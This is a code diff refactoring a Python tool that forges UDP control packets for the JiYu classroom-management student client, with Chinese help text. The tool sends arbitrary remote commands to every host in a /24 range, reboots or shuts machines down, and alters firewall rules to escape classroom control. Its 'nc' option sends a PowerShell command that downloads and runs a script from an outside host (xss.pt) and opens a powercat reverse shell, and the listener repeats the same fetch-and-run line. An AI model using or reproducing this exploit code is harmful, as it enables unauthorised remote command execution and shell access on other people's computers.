@@ -2,11 +2,16 @@ import sys
 import socket
 import random
 import argparse
-from re import compile
+import csv
+import locale
 from time import sleep
-from struct import pack
-from os import popen, system
-from multiprocessing import Pool
+from os import system
+from multiprocessing import Pool, freeze_support
+from dataclasses import dataclass
+from threading import Event
+from typing import Optional
+import subprocess
+import ipaddress
 
 store = [[0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x9e, 0x03, 0x00, 0x00, 0x10, 0x41, 0xaf, 0xfb, 0xa0, 0xe7, 0x52, 0x40, 0x91, 
           0xdc, 0x27, 0xa3, 0xb6, 0xf9, 0x29, 0x2e, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x50, 0x81, 0x91, 0x03, 0x00, 0x00, 0x91, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
@@ -26,31 +31,32 @@ basicCMD = {
 
 MESSAGE_OFFSET = 56
 MESSAGE_MAX_BYTES = (len(basicCMD['-msg']) - MESSAGE_OFFSET - 2) // 2 * 2
+COMMAND_OFFSET = 578
+COMMAND_MAX_BYTES = (len(basicCMD['-c']) - COMMAND_OFFSET - 2) // 2 * 2
 
-parser = argparse.ArgumentParser()
-parser.add_argument('-ip', type=str, help="ip 指定目标IP地址")
-parser.add_argument('-p', type=int, default=4705, help="port 指定监听端口，默认端口为4705")
-message_options = parser.add_mutually_exclusive_group()
-message_options.add_argument(
-    '-msg', type=str, help="发送文本消息，支持多行；超长内容自动分条")
-message_options.add_argument(
-    '--msg-file', type=str, metavar="PATH",
-    help="从 UTF-8 文件读取消息；使用 - 从标准输入读取")
-parser.add_argument(
-    '-c', type=str, help="command命令 eg: -c   \"cmd.exe /c ipconfig\"")
-parser.add_argument('-l', type=int, default=1, help="循环次数，默认为1")
-parser.add_argument('-t', type=int, default=22, help="循环时间间隔，默认是22秒")
+def build_parser():
+    parser = argparse.ArgumentParser(
+        description="极域学生端 UDP 控制报文测试工具",
+        epilog="图形界面请运行: python gui.py")
+    parser.add_argument('-ip', type=str, help="ip 指定目标IP地址")
+    parser.add_argument('-p', type=int, default=4705, help="port 指定监听端口，默认端口为4705")
+    message_options = parser.add_mutually_exclusive_group()
+    message_options.add_argument(
+        '-msg', type=str, help="发送文本消息，支持多行；超长内容自动分条")
+    message_options.add_argument(
+        '--msg-file', type=str, metavar="PATH",
+        help="从 UTF-8 文件读取消息；使用 - 从标准输入读取")
+    parser.add_argument(
+        '-c', type=str, help="command命令 eg: -c   \"cmd.exe /c ipconfig\"")
+    parser.add_argument('-l', type=int, default=1, help="循环次数，默认为1")
+    parser.add_argument('-t', type=int, default=22, help="循环时间间隔，默认是22秒")
+    parser.add_argument(
+        '-e', type=str, choices=['r', 's', 'g', 'nc', 'break', 'continue'],
+        help="Extra Options加载额外的选项 eg：-e r")
+    return parser
 
-parser.add_argument('-e', type=str, choices=['r', 's', 'g', 'nc', 'break', 'continue'], help="Extra Options加载额外的选项 eg：-e r"
-                    )
-subparsers = parser.add_subparsers(help='-e 参数的详细说明')
-subparsers.add_parser('r', help='reboot 重启')
-subparsers.add_parser('s', help='shutdown 关机')
-subparsers.add_parser('g', help='独立选项，获取当前的ip地址以及学生端监听的端口')
-subparsers.add_parser('nc', help='独立选项，反弹shell的机器需出网，退出可使用命令exit')
-subparsers.add_parser('break', help='独立选项，脱离屏幕控制，需要管理员权限')
-subparsers.add_parser('continue', help='独立选项，恢复屏幕控制')
-args = parser.parse_args()
+
+parser = build_parser()
 
 
 # 格式化要发送的消息
@@ -58,12 +64,12 @@ def format_b4_send(content):
     return list(content.encode('utf-16le'))
 
 
-def read_message():
-    if args.msg_file is None:
-        return args.msg
-    if args.msg_file == '-':
+def read_message(arguments):
+    if arguments.msg_file is None:
+        return arguments.msg
+    if arguments.msg_file == '-':
         return sys.stdin.read()
-    with open(args.msg_file, encoding='utf-8-sig', newline='') as message_file:
+    with open(arguments.msg_file, encoding='utf-8-sig', newline='') as message_file:
         return message_file.read()
 
 
@@ -72,7 +78,7 @@ def split_message(content):
     byte_count = 0
     for character in content:
         if character == '\x00':
-            raise ValueError("Message text cannot contain NUL characters")
+            raise ValueError("消息不能包含 NUL 字符")
         character_bytes = len(character.encode('utf-16le'))
         if byte_count + character_bytes > MESSAGE_MAX_BYTES:
             yield ''.join(chunk)
@@ -84,34 +90,32 @@ def split_message(content):
         yield ''.join(chunk)
 
 
-# 获取ip
+# 获取目标地址
 def get_ip(ip):
-    target_host = []
-    if ip.find('.') == -1:
-        print('\nYou enter a error IP.')
-        print("Please enter the correct format of the IP again.")
-        sys.exit(0)
-    if ip.find('-') != -1:
-        ip_arr = ip.split('-')
-        ip_arrs = ip_arr[0].split('.')
-        if int(ip_arr[1]) > 254:
-            ip_arr[1] = '254'
-        for i in range(int(ip_arrs[3]), int(ip_arr[1])+1):
-            ip_arrs[3] = str(i)
-            target_host.append('.'.join(ip_arrs))
-    elif ip.find('/') == -1:
-        target_host.append(ip)
-    elif ip.find('/24') != -1:
-        ip_arr = ip.split('/')
-        ip_arrs = ip_arr[0].split('.')
-        for i in range(1, 255):
-            ip_arrs[3] = str(i)
-            target_host.append('.'.join(ip_arrs))
-    else:
-        print('\nYou enter a error IP.')
-        print("Please enter the correct format of the IP again.")
-        sys.exit(0)
-    return target_host
+    if not isinstance(ip, str) or not ip.strip():
+        raise ValueError("请填写目标地址")
+    value = ip.strip()
+    try:
+        if '-' in value:
+            if value.count('-') != 1:
+                raise ValueError
+            start, end = value.split('-')
+            start_address = ipaddress.IPv4Address(start)
+            if not end.isdigit():
+                raise ValueError
+            start_octet = int(str(start_address).split('.')[3])
+            end_octet = int(end)
+            if not 1 <= start_octet <= end_octet <= 254:
+                raise ValueError
+            return [str(ipaddress.IPv4Address(int(start_address) + offset))
+                    for offset in range(end_octet - start_octet + 1)]
+        if '/' in value:
+            if not value.endswith('/24'):
+                raise ValueError
+            return [str(host) for host in ipaddress.IPv4Network(value, strict=False).hosts()]
+        return [str(ipaddress.IPv4Address(value))]
+    except ValueError as error:
+        raise ValueError("IP 格式错误，请使用单个地址、末段范围或 /24 网段") from error
 
 
 # 将要发送的消息打包成完整的指令
@@ -119,122 +123,255 @@ def pkg_sendlist(cmdtype, content):
     arrs = format_b4_send(content)
     if cmdtype == '-msg':
         if '\x00' in content:
-            raise ValueError("Message text cannot contain NUL characters")
+            raise ValueError("消息不能包含 NUL 字符")
         if len(arrs) > MESSAGE_MAX_BYTES:
-            raise ValueError("Message chunk exceeds the packet capacity")
+            raise ValueError("单条消息超过报文容量")
         result = basicCMD['-msg'].copy()
         result[MESSAGE_OFFSET:MESSAGE_OFFSET + len(arrs)] = arrs
         result[MESSAGE_OFFSET + len(arrs):MESSAGE_OFFSET + len(arrs) + 2] = [0, 0]
     elif cmdtype == '-c':
-        index = 578
-        result = basicCMD['-c']
-        for elem in arrs:
-            result[index] = elem
-            index += 1
+        if '\x00' in content:
+            raise ValueError("命令不能包含 NUL 字符")
+        if len(arrs) > COMMAND_MAX_BYTES:
+            raise ValueError("命令超过报文容量（最多 %d 个 UTF-16 单元）" % (COMMAND_MAX_BYTES // 2))
+        result = basicCMD['-c'].copy()
+        result[COMMAND_OFFSET:COMMAND_OFFSET + len(arrs)] = arrs
+        result[COMMAND_OFFSET + len(arrs):COMMAND_OFFSET + len(arrs) + 2] = [0, 0]
     return result
 
 
 # 发送
-def send(send_list):
+def send(send_list, target_ip, port=4705, loops=1, interval=22, report=None,
+         cancel_event=None):
     if len(send_list) == 0:
-        print("[-] error 请使用 -h 以获取命令帮助")
-        sys.exit(0)
-    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    target_host = get_ip(args.ip)
-    for times in range(args.l):
-        for i in target_host:
-            for abc in send_list:
-                payload = pack("%dB" % (len(abc)), *abc)
-                client.sendto(payload, (i, args.p))
-        if args.l == 1:
-            print("发送成功")
-            sys.exit(0)
-        print("第%s次执行完毕" % str(times + 1))
-        if times != args.l - 1:
-            sleep(args.t)
+        raise ValueError("没有可发送的报文")
+    if not 1 <= port <= 65535:
+        raise ValueError("端口必须在 1 到 65535 之间")
+    if loops < 1:
+        raise ValueError("发送轮数必须大于 0")
+    if interval < 0:
+        raise ValueError("发送间隔不能小于 0")
+
+    target_host = get_ip(target_ip)
+    sent_count = 0
+    if cancel_event and cancel_event.is_set():
+        raise RuntimeError("操作已取消")
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client:
+        client.settimeout(1.0)
+        for times in range(loops):
+            for host in target_host:
+                for packet_bytes in send_list:
+                    if cancel_event and cancel_event.is_set():
+                        raise RuntimeError("操作已取消")
+                    payload = bytes(packet_bytes)
+                    client.sendto(payload, (host, port))
+                    sent_count += 1
+            if report:
+                report("第 %d/%d 轮已发送" % (times + 1, loops))
+            if times != loops - 1 and interval:
+                if cancel_event:
+                    if cancel_event.wait(interval):
+                        raise RuntimeError("操作已取消")
+                else:
+                    sleep(interval)
+    return sent_count
 
 
-def creat_send_object():
+@dataclass
+class SendOptions:
+    target: str
+    port: int = 4705
+    message: str = ""
+    command: str = ""
+    extra: str = ""
+    loops: int = 1
+    interval: float = 22
+    cancel_event: Optional[Event] = None
+
+
+def validate_options(options):
+    if not options.target.strip():
+        raise ValueError("请填写目标地址")
+    try:
+        get_ip(options.target.strip())
+    except ValueError as error:
+        raise ValueError("目标地址格式无效") from error
+    if not 1 <= options.port <= 65535:
+        raise ValueError("端口必须在 1 到 65535 之间")
+    if options.loops < 1:
+        raise ValueError("发送轮数必须大于 0")
+    if options.interval < 0:
+        raise ValueError("发送间隔不能小于 0")
+    if options.extra not in {"", "r", "s"}:
+        raise ValueError("网络发送仅支持 r 或 s 扩展操作")
+    if not options.message and not options.command and not options.extra:
+        raise ValueError("至少填写消息、命令或选择设备操作")
+
+
+def prepare_packets(options, report=None):
+    validate_options(options)
+    packets = []
+    if options.message:
+        for chunk in split_message(options.message):
+            if options.cancel_event and options.cancel_event.is_set():
+                raise RuntimeError("操作已取消")
+            packets.append(pkg_sendlist("-msg", chunk))
+        if report:
+            report("已准备 %d 条消息" % len(packets))
+    if options.command:
+        packets.append(pkg_sendlist("-c", options.command))
+    if options.extra in {"r", "s"}:
+        packets.append(basicCMD["-" + options.extra].copy())
+    return packets
+
+
+def execute_send(options, report=None):
+    validate_options(options)
+    emit = report or (lambda message: None)
+    packets = prepare_packets(options, emit)
+    target_hosts = get_ip(options.target.strip())
+    emit("目标数量：%d，报文数量：%d" % (len(target_hosts), len(packets)))
+    sent_count = send(packets, options.target, options.port, options.loops,
+                      options.interval, emit, options.cancel_event)
+    emit("本机发送完成，共 %d 个报文" % sent_count)
+    return sent_count
+
+
+def creat_send_object(arguments):
     send_list = []
 
     # 获取命令内容
-    message = read_message()
+    message = read_message(arguments)
     if message:
         send_list.extend(pkg_sendlist('-msg', chunk) for chunk in split_message(message))
 
-    if args.c:
-        send_list.append(pkg_sendlist('-c', args.c))
+    if arguments.c:
+        send_list.append(pkg_sendlist('-c', arguments.c))
 
-    if args.e == 'r':
-        send_list.append(basicCMD['-r'])
+    if arguments.e == 'r':
+        send_list.append(basicCMD['-r'].copy())
 
-    if args.e == 's':
-        send_list.append(basicCMD['-s'])
+    if arguments.e == 's':
+        send_list.append(basicCMD['-s'].copy())
 
     return send_list
 
 
-def single_command():
-    if args.e == 'g':
+def _windows_command(command):
+    if sys.platform != 'win32':
+        raise RuntimeError("此功能仅支持 Windows")
+    return subprocess.run(
+        command, capture_output=True, text=True,
+        encoding=locale.getencoding(), errors='replace',
+        creationflags=subprocess.CREATE_NO_WINDOW, timeout=15)
+
+
+def local_ip_and_ports():
+    hostname = socket.gethostname()
+    ip = socket.gethostbyname(hostname)
+    tasks = _windows_command(['tasklist', '/FO', 'CSV', '/NH'])
+    if tasks.returncode:
+        raise RuntimeError(tasks.stderr.strip() or tasks.stdout.strip() or "进程查询失败")
+    pids = {row[1] for row in csv.reader(tasks.stdout.splitlines())
+            if len(row) >= 2 and 'student' in row[0].casefold()}
+    if not pids:
+        return ip, []
+    connections = _windows_command(['netstat', '-ano', '-p', 'UDP'])
+    if connections.returncode:
+        raise RuntimeError(connections.stderr.strip() or "监听端口查询失败")
+    ports = set()
+    for line in connections.stdout.splitlines():
+        fields = line.split()
+        if len(fields) >= 4 and fields[0] == 'UDP' and fields[-1] in pids:
+            port = fields[1].rsplit(':', 1)[-1]
+            if port.isdigit():
+                ports.add(port)
+    return ip, sorted(ports, key=int)
+
+
+def set_firewall_rule(action):
+    if action not in {'block', 'allow'}:
+        raise ValueError("不支持的防火墙操作")
+    commands = []
+    if action == 'block':
+        commands.extend([
+            ['sc.exe', 'config', 'MpsSvc', 'start=', 'auto'],
+            ['net.exe', 'start', 'MpsSvc'],
+            ['netsh', 'advfirewall', 'set', 'allprofiles', 'state', 'on'],
+        ])
+    commands.append(['netsh', 'advfirewall', 'firewall', 'set', 'rule',
+                     'name=StudentMain.exe', 'new', 'action=' + action])
+    results = []
+    for command in commands:
+        process = _windows_command(command)
+        results.append((' '.join(command), process.returncode,
+                        process.stdout.strip(), process.stderr.strip()))
+    return results
+
+
+def single_command(arguments):
+    if arguments.e == 'g':
         try:
-            hostname = socket.gethostname()
-            ip = socket.gethostbyname(hostname)
+            ip, ports = local_ip_and_ports()
+            if not ip:
+                print("未能获取本机 IP 地址")
+                return
             print("\nYour ip addres is:" + ip)
-
-            tasklist = popen("tasklist|find \"Student\"").read()
-            pattern = compile(r'[e]\s*\d{1,5}\s*[C]')
-            pid = (pattern.search(tasklist).group()[1:-1]).strip()
-
-            netstat = popen("netstat -ano |find \"{}\"".format(pid)).read()
-            pattern = compile(r"%s:\d{1,5}\s*[*]{1}" % ip)
-            netstat_pat = pattern.findall(netstat)
-
-            ports = [((i.strip(ip)[1:-1]).rstrip()) for i in netstat_pat]
             print("\nYour student client possible ports are:" + ','.join(ports))
-        except:
-            pass
-        sys.exit(0)
+        except Exception as error:
+            print("[-] %s" % error)
+        return
 
-    elif args.e == 'break':
-        popen('sc config MpsSvc start= auto')
-        popen('net start MpsSvc')
-        popen('netsh advfirewall set allprofiles state on')
-        popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=block')
+    elif arguments.e == 'break':
+        results = set_firewall_rule('block')
         sleep(1)
         system("cls")
-        sys.exit(0)
+        if any(item[1] != 0 for item in results):
+            print("[-] 部分防火墙设置失败，请检查管理员权限")
+        return
 
-    elif args.e == 'continue':
-        popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=allow')
-        sys.exit(0)
+    elif arguments.e == 'continue':
+        results = set_firewall_rule('allow')
+        failed = [item for item in results if item[1] != 0]
+        if failed:
+            print("[-] 部分防火墙设置失败，请检查管理员权限")
+            return
+        print("防火墙规则已恢复")
+        return
 
 
-def netcat(num):
+def netcat(num, arguments):
     send_list = []
     hostname = socket.gethostname()
     ip = socket.gethostbyname(hostname)
     cmd = "powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -c {} -p {} -e cmd".format(ip, num)
     send_list.append(pkg_sendlist('-c', cmd))
-    send(send_list)
+    send(send_list, arguments.ip, arguments.p, arguments.l, arguments.t)
 
 
-def run_from_cmd():
+def run_from_cmd(arguments):
     try:
-        single_command()
-        if args.e != 'nc':
-            send_list = creat_send_object()
-            send(send_list)
-            sys.exit(0)
+        single_command(arguments)
+        if arguments.e in {'g', 'break', 'continue'}:
+            return
+        if arguments.e != 'nc':
+            send_list = creat_send_object(arguments)
+            send(send_list, arguments.ip, arguments.p, arguments.l, arguments.t,
+                 report=print)
+            return
         num = random.randint(1, 65535)
         pool = Pool(processes=1)
-        pool.apply_async(netcat, (num,))
+        pool.apply_async(netcat, (num, arguments))
         print("listening on [any] {} ...".format(num))
         system("powershell IEX (New-Object System.Net.Webclient).DownloadString('https://xss.pt/hYvg');powercat -l -p {}".format(num))
         pool.close()
         pool.join()
     except Exception as e:
         print("[-] %s" % e)
+        return 1
+    return 0
 
 
 if __name__ == '__main__':
-    run_from_cmd()
+    freeze_support()
+    sys.exit(run_from_cmd(parser.parse_args()))
